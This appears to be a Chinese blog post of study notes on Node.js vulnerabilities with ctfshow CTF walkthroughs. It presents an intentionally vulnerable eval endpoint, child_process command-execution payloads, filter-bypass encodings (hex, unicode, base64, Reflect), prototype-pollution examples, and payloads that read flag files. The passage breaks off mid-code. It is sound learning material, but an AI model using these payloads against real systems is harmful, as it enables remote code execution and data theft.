<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/eval&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">a</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;require&#x27;</span>) !== -<span class="number">1</span>) &#123; <span class="comment">// 检测关键字</span></span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;Hacker&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="built_in">eval</span>(req.<span class="property">query</span>.<span class="property">a</span>));</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">query</span>.<span class="property">a</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">8888</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;http://127.0.0.1:8888/&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><img src="https://c1oudfl0w0.github.io/blog/2023/06/29/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230629170501622.png" alt="image-20230629170501622"></p>
<p>很明显上面的payload打不通了</p>
<p>这个时候可以使用<code>global.process.mainModule.constructor._load('child_process').exec('calc')</code>来执行命令，这里其实和flask ssti的payload有类似之处</p>
<ul>
<li><code>global</code> 对象是 Node.js 环境下的全局对象，它包含了 Node.js 中的一些全局变量和函数。</li>
<li><code>process</code> 对象是 <code>global</code> 对象的一个属性，它包含了当前 Node.js 进程的相关信息和控制方法。</li>
<li><code>mainModule</code> 属性是 <code>process</code> 对象的一个属性，它指向当前 Node.js 应用程序的入口模块。</li>
<li><code>constructor</code> 属性是 <code>mainModule</code> 对象的一个属性，它指向当前模块的构造函数。</li>
<li><code>_load()</code> 方法是 <code>constructor</code> 对象的一个方法，它可以加载指定的模块并返回该模块的导出对象。</li>
</ul>
<p>即<code>global.process.mainModule.constructor._load</code>==<code>require</code></p>
<p><img src="https://c1oudfl0w0.github.io/blog/2023/06/29/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230629170753689.png" alt="image-20230629170753689"></p>
<p>注：node 是基于 chrome v8 内核的，运行时，压根就不会有 <code>require</code> 这种关键字，模块加载不进来，所以有时候会报<code>require is not defined</code> 。但在 node交互环境，或者写 js 文件时，通过 node 运行会自动把 <code>require</code> 进行编译</p>
<h2 id="setIntval">setIntval()</h2>
<p>间隔两秒执行函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setInterval</span>(some_function, <span class="number">2000</span>)</span><br></pre></td></tr></table></figure>
<h2 id="setTimeout">setTimeout()</h2>
<p>两秒后执行函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(some_function, <span class="number">2000</span>);</span><br></pre></td></tr></table></figure>
<p>some_function处就类似于eval函数的参数</p>
<p>弹计算器：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setInterval</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;calc&#x27;</span>), <span class="number">2000</span>);</span><br></pre></td></tr></table></figure>
<p>Javascript</p>
<h3 id="整型溢出">整型溢出</h3>
<p>当设置的延迟时间不在<code>1~2^31-1</code>这个int范围内时，就会溢出为1，相当于0延迟</p>
<h2 id="Function">Function()</h2>
<p>输出HelloWorld：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Function</span>(<span class="string">&quot;console.log(&#x27;HelloWolrd&#x27;)&quot;</span>)()</span><br></pre></td></tr></table></figure>
<p>类似于php中的create_function</p>
<hr>
<h2 id="bypass">bypass</h2>
<h3 id="16进制编码">16进制编码</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a&quot;</span>===<span class="string">&quot;\x61&quot;</span>);</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>正则匹配的时候，16进制不会转化成字符，于是有</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&quot;exe\x63Sync&quot;</span>](<span class="string">&quot;curl 127.0.0.1:1234&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="unicode编码">unicode编码</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\u0061&quot;</span>===<span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&quot;exe\u0063Sync&quot;</span>](<span class="string">&quot;curl 127.0.0.1:1234&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="加号拼接">加号拼接</h3>
<p>加号在js中可以用来连接字符</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&#x27;exe&#x27;</span>%2b<span class="string">&#x27;cSync&#x27;</span>](<span class="string">&#x27;curl 127.0.0.1:1234&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="模板字符串">模板字符串</h3>
<p>上面讲特性的时候已经提到过了</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">&#x27;curl 127.0.0.1:1234&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="concat连接">concat连接</h3>
<p>利用js中的concat函数连接字符串</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&quot;exe&quot;</span>.<span class="title function_">concat</span>(<span class="string">&quot;cSync&quot;</span>)](<span class="string">&quot;curl 127.0.0.1:1234&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="base64编码">base64编码</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=&#x27;</span>,<span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>())</span><br></pre></td></tr></table></figure>
<p>接下来考虑一些js的语法和内置函数来bypass</p>
<h3 id="Obejct-keys">Obejct.keys</h3>
<p>实际上通过<code>require</code>导入的模块是一个<code>Object</code>，所以就可以用<code>Object</code>中的方法来操作获取内容。利用<code>Object.values</code>就可以拿到<code>child_process</code>中的各个函数方法，再通过数组下标就可以拿到<code>execSync</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="property">constructor</span>===<span class="title class_">Object</span>)</span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">values</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>))[<span class="number">5</span>](<span class="string">&#x27;curl 127.0.0.1:1234&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="Reflect">Reflect</h3>
<p>使用<code>Reflect</code>这个关键字来实现<strong>反射调用函数</strong></p>
<p>可以通过<code>Reflect.ownKeys(global)</code>拿到所有函数，然后<code>global[Reflect.ownKeys(global).find(x=&gt;x.includes('eval'))]</code>即可得到eval</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(<span class="variable language_">global</span>))</span><br><span class="line"><span class="comment">//返回所有函数</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">global</span>[<span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(<span class="variable language_">global</span>).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;eval&#x27;</span>))])</span><br><span class="line"><span class="comment">//拿到eval</span></span><br></pre></td></tr></table></figure>
<p>拿到eval，接下来就能rce了</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">global</span>[<span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(<span class="variable language_">global</span>).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;eval&#x27;</span>))](<span class="string">&#x27;global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;whoami&quot;)&#x27;</span>).<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure>
<p>这里还有个小trick：如果过滤了<code>eval</code>关键字，可以用<code>includes('eva')</code>来搜索<code>eval</code>函数，也可以用<code>startsWith('eva')</code>来搜索</p>
<h3 id="过滤中括号">过滤中括号</h3>
<p>获取到eval的方式是通过<code>global</code>数组，其中用到了中括号<code>[]</code>，假如中括号被过滤，可以用<code>Reflect.get</code>来绕</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Reflect.get(target, propertyKey[, receiver])`的作用是获取对象身上某个属性的值，类似于`target[name]</span><br></pre></td></tr></table></figure>
<p>所以取 eval 的函数方式变成</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Reflect</span>.<span class="title function_">get</span>(<span class="variable language_">global</span>, <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(<span class="variable language_">global</span>).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;eva&#x27;</span>)))</span><br></pre></td></tr></table></figure>
<p>后面拼接上命令执行的payload即可</p>
<hr>
<h1>基础原型链污染</h1>
<h2 id="原型链">原型链</h2>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">关于原型链的详细文章</a></p>
<p>在javascript，每一个实例对象都有一个<code>prototype</code>属性，<code>prototype</code> 属性可以向对象添加属性和方法</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">object.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">name</span>=value</span><br></pre></td></tr></table></figure>
<p>在javascript，每一个实例对象都有一个<code>__proto__</code>属性，这个实例属性指向对象的原型对象(即原型)</p>
<p>可以通过以下方式访问得到某一实例对象的原型对象：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">objectname[<span class="string">&quot;__proto__&quot;</span>]</span><br><span class="line">objectname.<span class="property">__proto__</span></span><br><span class="line">objectname.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span></span><br></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="comment">// o对象直接继承了Object.prototype</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// o ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="string">&quot;yo&quot;</span>, <span class="string">&quot;whadup&quot;</span>, <span class="string">&quot;?&quot;</span>];</span><br><span class="line"><span class="comment">// 数组都继承于 Array.prototype</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 函数都继承于 Function.prototype</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</span></span><br></pre></td></tr></table></figure>
<p><img src="https://c1oudfl0w0.github.io/blog/2023/06/29/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230630120238373.png" alt="image-20230630120238373"></p>
<hr>
<h2 id="漏洞原理">漏洞原理</h2>
<p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">p神的文章</a></p>
<p>对于语句：<code>object[a][b] = value</code> 如果可以控制a、b、value的值，将a设置为<code>__proto__</code>，</p>
<p>我们就可以给object对象的原型设置一个b属性，值为value。</p>
<p>这样所有<strong>继承object对象原型</strong>的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。</p>
<p>例子：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">object1 = &#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>, <span class="string">&quot;b&quot;</span>:<span class="number">2</span>&#125;;</span><br><span class="line">object1.<span class="property">__proto__</span>.<span class="property">foo</span> = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object1.<span class="property">foo</span>);</span><br><span class="line">object2 = &#123;<span class="string">&quot;c&quot;</span>:<span class="number">1</span>, <span class="string">&quot;d&quot;</span>:<span class="number">2</span>&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object2.<span class="property">foo</span>);</span><br></pre></td></tr></table></figure>
<p>Javascript</p>
<p><img src="https://c1oudfl0w0.github.io/blog/2023/06/29/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230630120634433.png" alt="image-20230630120634433"></p>
<p>我们可以发现<code>object2</code>在没有设置foo属性的情况下，也输出了Hello World</p>
<p>因为在第二条语句中，我们对object1的原型对象设置了一个foo属性，而object2和object1一样，都是继承了<code>Object.prototype</code>。</p>
<p>在获取object2.foo时，由于object2本身不存在foo属性，就会往父类<code>Object.prototype</code>中去寻找</p>
<p>这就造成了一个原型链污染，所以原型链污染的本质应该是利用<strong>子类继承父类的特性</strong>实现的，只要我们能控制一个子类并修改其对象的原型，就能影响到所有和这个对象同一个原型的对象</p>
<hr>
<h2 id="merge操作">merge操作</h2>
<blockquote>
<p>表示合并两个或多个对象或数组的操作，将它们的属性或元素合并到一个新的对象或数组中</p>
</blockquote>
<p>例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> object1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> object2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="title function_">merge</span>(object1, object2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object1.<span class="property">a</span>, object1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">object3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object3.<span class="property">b</span>)</span><br></pre></td></tr></table></figure>
<p>注：在JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。</p>
<p>最终输出的结果为</p>
<p><img src="https://c1oudfl0w0.github.io/blog/2023/06/29/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230630122542932.png" alt="image-20230630122542932"></p>
<p>可见object3的b是从原型中获取到的，说明Object已经被污染了。</p>
<p>大致流程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">object2.a=1=object1.a</span><br><span class="line">object2.__proto__=&#123;&quot;b&quot;: 2&#125;=object1.__proto__=object3.__proto__`–&gt;`object3=&#123;&quot;b&quot;: 2&#125;`–&gt;`object3.b=2</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="bypass-2">bypass</h2>
<h3 id="proto-过滤">__proto__过滤</h3>
<p>过滤了<code>__proto__</code>可以考虑在末尾加空格<code>__proto__ </code>，或者使用上面提到的<code>obj.constructor.prototype</code>来代替，<code>obj.constructor.prototype==obj.__proto__</code></p>
<p>即</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;ctfshow&quot;</span><span class="punctuation">:</span><span class="string">&quot;36dboy&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;ctfshow&quot;</span><span class="punctuation">:</span><span class="string">&quot;36dboy&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h1>web334</h1>
<p>login.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入Express框架</span></span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="comment">// 创建路由器实例</span></span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="comment">// 引入用户模块，获取用户数据</span></span><br><span class="line"><span class="keyword">var</span> users = <span class="built_in">require</span>(<span class="string">&#x27;../modules/user&#x27;</span>).<span class="property">items</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数，用于在用户列表中查找匹配的用户</span></span><br><span class="line"><span class="keyword">var</span> findUser = <span class="keyword">function</span>(<span class="params">name, password</span>) &#123;</span><br><span class="line">  <span class="comment">// 使用数组的find方法查找用户</span></span><br><span class="line">  <span class="keyword">return</span> users.<span class="title function_">find</span>(<span class="keyword">function</span>(<span class="params">item</span>) &#123;</span><br><span class="line">    <span class="comment">// 检查用户名是否为CTFSHOW以外的值，并且用户名和密码匹配</span></span><br><span class="line">    <span class="comment">// 用户名转换为大写进行比较，密码直接比较</span></span><br><span class="line">    <span class="keyword">return</span> name !== <span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>() &amp;&amp; item.<span class="property">password</span> === password;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * 处理POST请求，用于用户登录</span></span><br><span class="line"><span class="comment"> * 请求路径：/</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="comment">// 设置响应类型为HTML</span></span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 定义一个示例flag（实际应用中应替换为真实的flag）</span></span><br><span class="line">  <span class="keyword">var</span> flag = <span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 获取当前请求的会话对象</span></span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 调用findUser函数，根据请求体中的用户名和密码查找用户</span></span><br><span class="line">  <span class="keyword">var</span> user = <span class="title function_">findUser</span>(req.<span class="property">body</span>.<span class="property">username</span>, req.<span class="property">body</span>.<span class="property">password</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果找到匹配的用户</span></span><br><span class="line">  <span class="keyword">if</span> (user) &#123;</span><br><span class="line">    <span class="comment">// 重新生成会话ID（安全措施，防止会话劫持）</span></span><br><span class="line">    req.<span class="property">session</span>.<span class="title function_">regenerate</span>(<span class="keyword">function</span>(<span class="params">err</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="comment">// 如果会话再生失败，返回错误响应</span></span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span> &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 将登录用户信息存储到会话中</span></span><br><span class="line">      req.<span class="property">session</span>.<span class="property">loginUser</span> = user.<span class="property">username</span>;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 返回成功响应，包含flag</span></span><br><span class="line">      res.<span class="title function_">json</span>(&#123; <span class="attr">ret_code</span>: <span class="number">0</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录成功&#x27;</span>, <span class="attr">ret_flag</span>: flag &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果未找到用户，返回错误响应</span></span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">ret_code</span>: <span class="number">1</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;账号或密码错误&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 导出路由器模块</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>
<p>user.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">items</span>: [</span><br><span class="line">    &#123;<span class="attr">username</span>: <span class="string">&#x27;CTFSHOW&#x27;</span>, <span class="attr">password</span>: <span class="string">&#x27;123456&#x27;</span>&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>关键部分</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>() &amp;&amp; item.<span class="property">password</span> === password;</span><br></pre></td></tr></table></figure>
<p>我们传入的name不能是大写的CTFSHOW，然而我们的账号就是大写的CTFSHOW，不要急我们接着往下看，后面有一个tuUpperCase，他会把我们传入的小写字母变成大写的，所以这里我们就直接传进去小写的ctfshow就可以了，密码123456</p>
<h1>web335</h1>
<p>在网页源码当中看到需要传入的参数?eval=</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">    require(&#x27;child_process&#x27;).execSync(&#x27;cat f*&#x27;).toString()</span><br><span class="line">    require(&#x27;child_process&#x27;).spawnSync(&#x27;cat&#x27;, [&#x27;f*&#x27;]).stdout.toString()</span><br><span class="line"> </span><br><span class="line">    execFileSync只能执行ls之类，他cat不了文件，后续有可以cat的操作</span><br><span class="line">    require(&#x27;child_process&#x27;).execSync(&#x27;cat f*&#x27;) 这里突然发现不用toString也行</span><br></pre></td></tr></table></figure>
<p>这里使用的是js的shell</p>
<p><img src="/2025/03/16/nodejs/image-20250309184643785.png" alt="image-20250309184643785"></p>
<p><a href="https://blog.csdn.net/m0_64815693/article/details/130076401">https://blog.csdn.net/m0_64815693/article/details/130076401</a></p>
<p>使用require加载child_process模块</p>
<p>然后调用child_process当中的execSync</p>
<p>最后加的toString来</p>
<p><code>execSync</code> 返回的是 <strong>Buffer</strong>，如果不转换，你拿到的是二进制数据，而不是字符串</p>
<p>buffer</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> buf = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;Hello&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(buf); <span class="comment">// &lt;Buffer 48 65 6c 6c 6f&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>stdout</code> 代表 <strong>标准输出</strong>（Standard Output），即 <code>spawnSync</code> 运行命令后返回的数据输出</p>
<h1>web336</h1>
<p>过滤了exec</p>
<p>方法一：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;tac&#x27;,[&#x27;fl001g.txt&#x27;]).stdout.toString()</span><br><span class="line"></span><br><span class="line">.stdout 访问子进程的标准输出，它是一个缓冲区（Buffer）对象。</span><br><span class="line">.toString() 方法将缓冲区转换为字符串，使输出内容可读。</span><br></pre></td></tr></table></figure>
<p>方法二：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">读取文件</span><br><span class="line">require(&#x27;fs&#x27;).readFileSync(&#x27;/app/routes/index.js&#x27;,&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">require(&#x27;child_process&#x27;)[&#x27;execSync&#x27;](&#x27;cat f*&#x27;).toString()</span><br></pre></td></tr></table></figure>
<p>方法三：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//列出当前目录下的文件</span><br><span class="line">require(&#x27;fs&#x27;).readdirSync(&#x27;./&#x27;)</span><br><span class="line">payload:</span><br><span class="line">    require(%27fs%27).readFileSync(%27./fl001g.txt%27)</span><br></pre></td></tr></table></figure>
<p>方法四：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?eval=require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>
<h1>web337</h1>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">md5</span>(<span class="params">s</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .<span class="title function_">update</span>(s)</span><br><span class="line">    .<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> b = req.<span class="property">query</span>.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br><span class="line">  	res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  	res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">msg</span>: <span class="string">&#x27;tql&#x27;</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span 